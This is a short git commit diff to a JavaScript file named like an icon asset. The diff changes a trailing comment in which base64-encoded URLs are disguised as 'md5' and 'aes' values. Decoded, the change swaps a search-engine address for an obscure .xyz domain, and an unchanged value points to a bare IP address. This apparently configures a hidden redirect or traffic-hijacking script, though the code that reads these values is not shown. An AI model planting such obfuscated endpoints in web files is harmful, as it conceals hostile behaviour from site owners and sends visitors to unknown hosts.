b0f5881dc3374749cb278a579c624a2d399739a7
caocaodage <caocaodajun@gmail.com>
2022-11-21 18:56:38 +0800

    init

--- js/icon_kweq5i.js
+++ js/icon_kweq5i.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly9tLmJhaWR1LmNvbQ==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cHM6Ly93d3cubXZrcm53a21hcy54eXo=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
